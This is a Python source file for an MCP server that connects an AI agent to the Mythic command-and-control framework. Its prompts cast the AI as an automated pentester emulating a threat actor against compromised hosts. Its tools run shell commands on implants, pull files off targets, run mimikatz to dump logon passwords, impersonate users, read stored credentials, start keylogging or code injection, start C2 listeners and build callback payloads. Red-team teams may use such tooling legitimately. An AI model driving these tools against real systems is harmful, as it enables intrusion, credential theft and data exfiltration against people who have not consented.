import asyncio
import base64
import json
import os
import argparse
from typing import Any

from mcp.server.fastmcp import FastMCP
from lib.mythic_api import MythicAPI, MythicAPIError

mcp = FastMCP("mythic_mcp")
api: MythicAPI | None = None


# ---------------------------------------------------------------------------
# Prompts
# ---------------------------------------------------------------------------

@mcp.prompt()
def start_pentest(threat_actor: str, objective: str) -> str:
    return (
        f"You are an automated pentester emulating {threat_actor}. "
        f"Objective: {objective}. "
        "Use only techniques documented for that threat actor. "
        "Start by listing active agents, then work toward the objective step by step."
    )


@mcp.prompt()
def start_recon() -> str:
    return (
        "You are an automated pentester performing initial recon. "
        "List all active agents, then gather host info, running processes, "
        "network interfaces, and local users on each compromised host."
    )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _ok(data: Any) -> str:
    return json.dumps({"status": "ok", "data": data}, default=str)


def _err(msg: str) -> str:
    return json.dumps({"status": "error", "message": msg})


# ---------------------------------------------------------------------------
# Feature 2 — richer agent/callback management
# ---------------------------------------------------------------------------

@mcp.tool()
async def get_all_agents() -> str:
    """Return a JSON list of all active agents with full details.

    Fields per agent: display_id, host, user, os, architecture, pid,
    integrity_level, domain, ip, external_ip, sleep_info, last_checkin,
    process_name, payload type.
    """
    try:
        agents = await api.get_all_agents()
        return _ok(agents)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def get_agent_details(agent_id: int) -> str:
    """Return full detail for a single agent by its display ID.

    Args:
        agent_id: Display ID of the agent (callback) to inspect.
    """
    try:
        agent = await api.get_agent_details(agent_id)
        if agent is None:
            return _err(f"No active agent with display_id {agent_id}")
        return _ok(agent)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def kill_agent(agent_id: int) -> str:
    """Mark an agent as inactive (remove it from Mythic).

    Args:
        agent_id: Display ID of the agent to kill.
    """
    try:
        ok = await api.kill_agent(agent_id)
        if ok:
            return _ok(f"Agent {agent_id} removed successfully")
        return _err(f"Agent {agent_id} not found or already inactive")
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def set_sleep(agent_id: int, interval: int, jitter: int) -> str:
    """Change the sleep interval and jitter on a running agent.

    Args:
        agent_id: Display ID of the agent.
        interval: New sleep interval in seconds.
        jitter: Jitter percentage (0-100).
    """
    try:
        output = await api.set_sleep(agent_id, interval, jitter)
        return _ok({"output": output})
    except MythicAPIError as e:
        return _err(str(e))


# ---------------------------------------------------------------------------
# Feature 1 — download_file (was in mythic_api.py but never exposed)
# ---------------------------------------------------------------------------

@mcp.tool()
async def download_file(agent_id: int, file_path: str) -> str:
    """Download a file from a remote agent and return it as base64.

    Args:
        agent_id: Display ID of the agent.
        file_path: Full path of the file to download from the target.
    """
    try:
        content = await api.download_file(agent_id, file_path)
        return _ok({
            "file_path": file_path,
            "size_bytes": len(content),
            "content_b64": base64.b64encode(content).decode(),
        })
    except MythicAPIError as e:
        return _err(str(e))


# ---------------------------------------------------------------------------
# Original tools — fixed (feature 11)
# ---------------------------------------------------------------------------

@mcp.tool()
async def run_shell_command(agent_id: int, command_line: str) -> str:
    """Execute a shell command on a running agent via the default interpreter.

    Args:
        agent_id: Display ID of the agent.
        command_line: Command to execute.
    """
    try:
        output = await api.execute_shell_command(agent_id, command_line)
        return _ok({"output": output})
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def read_file(agent_id: int, file_path: str) -> str:
    """Read a file from a remote agent using the cat command.

    Args:
        agent_id: Display ID of the agent.
        file_path: Path of the file to read on the target.
    """
    try:
        output = await api.read_file(agent_id, file_path)
        return _ok({"file_path": file_path, "content": output})
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def upload_file(agent_id: int, file_name: str, remote_path: str, content_b64: str) -> str:
    """Upload a file to a remote agent.

    Args:
        agent_id: Display ID of the agent.
        file_name: Name to register the file as in Mythic.
        remote_path: Full destination path on the target.
        content_b64: Base64-encoded file contents.
    """
    try:
        decoded = base64.b64decode(content_b64)
        ok = await api.upload_file(agent_id, file_name, remote_path, decoded)
        if ok:
            return _ok(f"File uploaded to {remote_path}")
        return _err("Upload task completed but Mythic reported failure")
    except MythicAPIError as e:
        return _err(str(e))
    except Exception as e:
        return _err(f"Invalid base64 content: {e}")


@mcp.tool()
async def run_as_user(agent_id: int, username: str, password: str) -> str:
    """Authenticate as another user (network calls only) via make_token.

    Args:
        agent_id: Display ID of the agent.
        username: Username of the network account.
        password: Password for the account.
    """
    try:
        output = await api.make_token(agent_id, username, password)
        return _ok({"output": output})
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def execute_mimikatz(agent_id: int, mimikatz_arguments: str) -> str:
    """Run mimikatz with the given arguments and return its output.

    Args:
        agent_id: Display ID of the agent.
        mimikatz_arguments: Arguments to pass to mimikatz (e.g. 'sekurlsa::logonpasswords').
    """
    try:
        output = await api.execute_mimikatz(agent_id, mimikatz_arguments)
        return _ok({"output": output})
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def execute_command(agent_id: int, command_name: str, parameters: str) -> str:
    """Generic task dispatcher — run any Mythic command by name.

    Use this for commands not covered by dedicated tools (e.g. ps, ls, inject,
    screenshot, keylog_start, etc.) or when targeting non-Apollo agents.

    Args:
        agent_id: Display ID of the agent.
        command_name: Mythic command name (e.g. 'ps', 'ls', 'screenshot').
        parameters: JSON string of parameters, or a plain string for commands
                    that accept a single string argument.
    """
    try:
        try:
            params = json.loads(parameters)
        except (json.JSONDecodeError, TypeError):
            params = parameters
        output = await api.execute_command(agent_id, command_name, params)
        return _ok({"output": output})
    except MythicAPIError as e:
        return _err(str(e))


# ---------------------------------------------------------------------------
# Feature 10 — Mythic platform features
# ---------------------------------------------------------------------------

@mcp.tool()
async def get_credentials() -> str:
    """Return all credentials stored in the Mythic credential store."""
    try:
        creds = await api.get_credentials()
        return _ok(creds)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def get_artifacts(limit: int = 200) -> str:
    """Return the Mythic artifact log (files, registry keys, processes created, etc.).

    Args:
        limit: Maximum number of artifacts to return (default 200).
    """
    try:
        artifacts = await api.get_artifacts(limit)
        return _ok(artifacts)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def get_event_log(limit: int = 100) -> str:
    """Return recent entries from the Mythic operation event log.

    Args:
        limit: Maximum number of log entries to return (default 100).
    """
    try:
        events = await api.get_event_log(limit)
        return _ok(events)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def browse_files(agent_id: int, path: str = "/") -> str:
    """List directory contents via Mythic's file browser for an agent.

    Args:
        agent_id: Display ID of the agent.
        path: Directory path to list (default '/').
    """
    try:
        entries = await api.browse_files(agent_id, path)
        return _ok(entries)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def list_payloads() -> str:
    """Return all non-deleted payloads registered in Mythic."""
    try:
        payloads = await api.list_payloads()
        return _ok(payloads)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def list_c2_profiles() -> str:
    """Return all C2 profiles configured in Mythic with their running status."""
    try:
        profiles = await api.list_c2_profiles()
        return _ok(profiles)
    except MythicAPIError as e:
        return _err(str(e))


@mcp.tool()
async def start_listener(c2_profile_name: str, action: str = "start") -> str:
    """Start or stop a Mythic C2 profile listener.

    Args:
        c2_profile_name: Name of the C2 profile (e.g. 'http', 'https').
        action: 'start' or 'stop' (default 'start').
    """
    try:
        result = await api.start_c2_listener(c2_profile_name, action)
        return _ok(result)
    except MythicAPIError as e:
        return _err(str(e))
    except Exception as e:
        return _err(str(e))


@mcp.tool()
async def create_payload(
    payload_type: str,
    operating_system: str,
    filename: str,
    c2_profile: str,
    c2_params: str,
    description: str = "",
    timeout: int = 120,
) -> str:
    """Build a new payload in Mythic and return its UUID and build status.

    Args:
        payload_type: Payload type name (e.g. 'apollo', 'poseidon').
        operating_system: OS string as Mythic expects (e.g. 'Windows', 'Linux').
        filename: Filename for the built artifact (e.g. 'agent.exe').
        c2_profile: C2 profile name (e.g. 'http').
        c2_params: JSON string of C2 profile parameters
                   (e.g. '{"callback_host": "http://192.168.0.1", "callback_port": 80}').
        description: Optional human-readable description for this payload.
        timeout: Seconds to wait for the build to complete (default 120).
    """
    try:
        params = json.loads(c2_params)
    except (json.JSONDecodeError, TypeError) as e:
        return _err(f"c2_params must be valid JSON: {e}")
    try:
        result = await api.create_payload(
            payload_type=payload_type,
            operating_system=operating_system,
            filename=filename,
            c2_profile=c2_profile,
            c2_params=params,
            description=description,
            timeout=timeout,
        )
        return _ok(result)
    except MythicAPIError as e:
        return _err(str(e))
    except Exception as e:
        return _err(str(e))


@mcp.tool()
async def save_payload_locally(payload_uuid: str, local_path: str) -> str:
    """Download a built Mythic payload and save it to the local filesystem.

    Args:
        payload_uuid: UUID of the payload to download.
        local_path: Absolute local path to write the file to (e.g. '/tmp/mythic.exe').
    """
    import os as _os
    try:
        data = await api.download_payload_bytes(payload_uuid)
        with open(local_path, "wb") as fh:
            fh.write(data)
        return _ok({"saved_to": local_path, "size_bytes": len(data)})
    except MythicAPIError as e:
        return _err(str(e))
    except Exception as e:
        return _err(str(e))


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

async def main():
    await api.connect()
    await mcp.run_stdio_async()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mythic MCP server")
    parser.add_argument("username", nargs="?", default=os.getenv("MYTHIC_USERNAME"), help="Mythic username (or set MYTHIC_USERNAME)")
    parser.add_argument("password", nargs="?", default=os.getenv("MYTHIC_PASSWORD"), help="Mythic password (or set MYTHIC_PASSWORD)")
    parser.add_argument("host",     nargs="?", default=os.getenv("MYTHIC_HOST", "localhost"), help="Mythic host (or set MYTHIC_HOST)")
    parser.add_argument("port",     nargs="?", default=os.getenv("MYTHIC_PORT", "7443"), help="Mythic port (or set MYTHIC_PORT)")
    parser.add_argument("--no-ssl", action="store_true", help="Disable TLS (not recommended)")
    args = parser.parse_args()

    if not args.username or not args.password:
        parser.error("username and password are required (pass as args or set MYTHIC_USERNAME / MYTHIC_PASSWORD env vars)")

    api = MythicAPI(
        username=args.username,
        password=args.password,
        server_ip=args.host,
        server_port=args.port,
        use_ssl=not args.no_ssl,
    )

    asyncio.run(main())
